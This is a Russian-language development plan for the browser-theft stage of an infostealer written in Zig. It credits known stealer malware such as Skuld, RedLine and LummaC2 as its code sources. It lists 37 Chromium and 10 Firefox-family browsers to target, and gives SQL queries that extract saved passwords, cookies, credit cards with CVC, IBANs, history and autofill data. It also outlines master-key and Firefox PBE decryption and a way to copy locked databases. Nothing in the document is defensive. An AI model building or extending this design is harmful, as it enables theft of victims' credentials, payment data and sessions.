# Phase 4.3: Browser Theft — План реализации

## Источники кода

| Источник | Браузеры | Ключевые техники |
|----------|----------|-----------------|
| **Skuld** (`browsers/paths.go`) | 37 Chromium + 10 Gecko | ASN1+NSS+PBE Firefox decrypt |
| **BrowserSnatch** (`ChromiumParser.cpp`) | 33 Chromium + 12 Gecko | Locked DB copy, App-Bound COM |
| **TheBear** (`BrowserGrabber.c`) | 16 Chromium | NT syscalls file I/O |
| **SentinelStealer** (`Chromium.cs`) | All Chromium + Gecko | Extension wallets 90+ IDs |
| **LummaC2** | 9 Chromium | Wallet extension IDs |
| **RedLine** | 18 Chromium | Custom SQLite parser pattern |

## Файлы к реализации

### UPDATE: `chromium_paths.zig` — 37+ путей Chromium

Из Skuld `paths.go` + BrowserSnatch `ChromiumParser.cpp`:
```zig
"Chromium", "Thorium", "Chrome", "Chrome (x86)", "Chrome SxS",
"Maple", "Iridium", "7Star", "CentBrowser", "Chedot", "Vivaldi",
"Kometa", "Elements", "Epic Privacy Browser", "Uran", "Fenrir",
"Catalina", "Coowon", "Liebao", "QIP Surf", "Orbitum",
"Dragon", "360Browser", "Maxthon", "K-Melon", "CocCoc",
"Brave", "Amigo", "Torch", "Sputnik", "Edge", "DCBrowser",
"Yandex", "UR Browser", "Slimjet", "Opera", "OperaGX"
```

### NEW: `chromium_login.zig`

**SQL:** `SELECT origin_url, username_value, password_value FROM logins`

**Flow:**
```
sqLoot.open("Login Data")
  → readTable("logins")
  → for each row: extract url, username, encrypted password
  → chrome_crypto.decryptPassword(encrypted, master_key)
  → format: "URL | username | password"
```

### NEW: `chromium_cookies.zig`

**SQL:** `SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies`

### NEW: `chromium_cards.zig`

**SQL:** `SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, billing_address_id FROM credit_cards`
**CVC:** `SELECT guid, value FROM local_stored_cvc`
**IBANs:** `SELECT guid, value FROM local_ibans`

### NEW: `chromium_history.zig`

**SQL:** `SELECT url, title, visit_count, last_visit_time FROM urls`

### NEW: `chromium_autofill.zig`

**SQL:** `SELECT name, value FROM autofill`

### NEW: `chromium_bookmarks.zig`

Парсинг `Bookmarks` JSON.

### NEW: `chromium.zig` — Оркестратор

```zig
pub fn collect(allocator, local_app_data) ![]BrowserData {
  // 1. Итерировать 37+ browsers из chromium_paths
  // 2. Для каждого: проверить User Data/Local State
  // 3. Извлечь master key из Local State
  // 4. Итерировать профили (Default, Profile 1..N)
  // 5. Для каждого: вызвать login, cookies, cards, history, autofill, bookmarks
}
```

### NEW: `firefox_paths.zig` — 10 Gecko

```zig
"Firefox", "SeaMonkey", "Waterfox", "K-Meleon",
"Thunderbird", "IceDragon", "Cyberfox", "BlackHaw",
"Pale Moon", "Mercury"
```

### NEW: `firefox_asn1.zig` — ASN1 PBE decoder

Три типа PBE из Skuld `crypto.go`:
- **nssPBE**: SHA1 → HMAC-SHA1 → 3DES-CBC
- **metaPBE**: PBKDF2-SHA256 → AES-128-CBC
- **loginPBE**: 3DES-CBC direct

### NEW: `firefox_login.zig` — logins.json

Два подхода:
1. **Primary:** ASN1 + PBKDF2 + AES-128-CBC/3DES-CBC (из Skuld)
2. **Fallback:** nss3.dll → NSS_Init → PK11SDR_Decrypt

### NEW: `firefox_cookies.zig`

**SQL:** `SELECT host, name, path, value, expiry FROM moz_cookies`

### NEW: `firefox_history.zig`

**SQL:** `SELECT url, title, visit_count, last_visit_date FROM moz_places`

### NEW: `firefox_bookmarks.zig`

**SQL:** `SELECT fk, title, dateAdded FROM moz_bookmarks`
+ `SELECT url FROM moz_places WHERE id = ?`

### NEW: `firefox.zig` — Оркестратор

## Зависимости

| Модуль | Зависит от |
|--------|-----------|
| chromium_login | sqLoot, file_io, chrome_crypto, appbound |
| chromium_cookies | sqLoot, file_io, chrome_crypto |
| chromium_cards | sqLoot, file_io, chrome_crypto |
| chromium_history | sqLoot, file_io |
| chromium_autofill | sqLoot, file_io |
| chromium_bookmarks | chrome_key (JSON) |
| firefox_asn1 | — |
| firefox_login | firefox_asn1, dll_loader |
| firefox_cookies | sqLoot, file_io |
| firefox_history | sqLoot, file_io |
| firefox_bookmarks | sqLoot, file_io |

## Locked DB handling

```zig
pub fn openBrowserDb(base_path: []const u8, filename: []const u8) ?sqLoot.SqliteDb {
    // 1. Попробовать открыть напрямую (sqLoot.open)
    // 2. Если locked → копировать → открыть копию
}
```

## Тестирование

Каждый модуль → Zig test блоки:
- chromium_login: mock Login Data → verify decrypt
- firefox_asn1: известные ASN1 вектора
- firefox_login: mock logins.json → verify format
